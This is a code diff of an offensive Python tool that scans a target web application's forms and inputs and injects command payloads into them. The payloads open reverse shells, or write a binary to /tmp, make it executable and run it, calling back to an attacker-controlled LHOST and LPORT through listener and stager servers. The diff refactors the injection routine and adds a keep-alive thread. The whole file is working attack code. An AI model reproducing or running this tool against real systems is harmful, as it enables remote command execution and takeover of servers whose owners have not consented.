@@ -9,6 +9,7 @@ from server import ReverseListener, ControlTower
 import random
 import string
 import time
+import threading
 
 parser = argparse.ArgumentParser(description='Test')
 
@@ -69,7 +70,7 @@ if not args.lhost:
 LHOST = args.lhost
 LPORT = args.lport
 
-has_shell = False
+inject_success = False
 
 
 def on_recv(data):
@@ -77,8 +78,8 @@ def on_recv(data):
 
 
 def on_shell(addr):
-    global has_shell
-    has_shell = True
+    global inject_success
+    inject_success = True
 
 
 try:
@@ -86,12 +87,23 @@ try:
 
     generator = Generator(lhost=LHOST, lport=LPORT)
 
+    def try_inject(pl):
+        if monkey.get_forms():
+            print("Injecting via forms")
+            monkey.autoinject_forms(pl)
+
+        if monkey.get_inputs() and not inject_success:
+            print("Injecting with names found in inputs")
+            monkey.autoinject_urls(pl)
+
+        if monkey.get_inputs() and not inject_success and (len(args.names) > 0):
+            print("Injecting via endpoints with custom names")
+            shell = generator.ir_shell()
+            monkey.autoinject_urls(shell)
+
     if monkey.get_forms() is None and monkey.get_inputs() is None:
         print("Nowhere to inject")
         exit(1)
-
-    print(monkey.get_js_endpoints())
-    print(monkey.get_js_urls())
 
     if args.ptype == 'shell':
         listener = ReverseListener(
@@ -100,6 +112,8 @@ try:
         listener.start()
 
         pl = generator.ir_shell()
+
+        try_inject(pl)
 
     elif args.ptype == 'binshell':
         listener = ReverseListener(
@@ -111,12 +125,16 @@ try:
         n = randword(4)
         pl = f'printf "{pl_bin}" > /tmp/{n} && chmod +x /tmp/{n} && /tmp/{n}'
 
+        try_inject(pl)
+
     elif args.ptype == 'stager':
-        pl_bin = generator.ir_stager()
+        pl_bin = Generator.bin_stager(lhost=LHOST, lport=STAGER_CONTROL_PORT)
         n = randword(4)
         pl = f'printf "{pl_bin}" > /tmp/{n} && chmod +x /tmp/{n} && /tmp/{n}'
 
         def on_connect(ct):
+            global inject_success
+            inject_success = True
             print('Stager injected, what to do?')
             test = input('>')
             print('TEST', test)
@@ -124,6 +142,11 @@ try:
         ct = ControlTower(ip=LHOST, port=int(STAGER_CONTROL_PORT), success_cb=on_connect)
 
         ct.start()
+
+        try_inject(pl)
+
+        t = threading.Thread(target=lambda x: [time.sleep(x) for _ in range(1, 100000)], args=(1000,))
+        t.start()
 
     elif args.ptype == 'custom':
         listener = ReverseListener(
@@ -133,20 +156,9 @@ try:
 
         pl = args.payload
 
-    if monkey.get_forms():
-        print("Injecting via forms")
-        monkey.autoinject_forms(pl)
+        try_inject(pl)
 
-    if monkey.get_inputs() and not has_shell:
-        print("Injecting with names found in inputs")
-        monkey.autoinject_urls(pl)
-
-    if monkey.get_inputs() and not has_shell and (len(args.names) > 0):
-        print("Injecting via endpoints with custom names")
-        shell = generator.ir_shell()
-        monkey.autoinject_urls()
-
-    if not has_shell and args.ptype != 'stager':
+    if not inject_success and args.ptype != 'stager':
         print("\n")
         if not args.payload:  # if we don't care about output
             print("Failed :(")
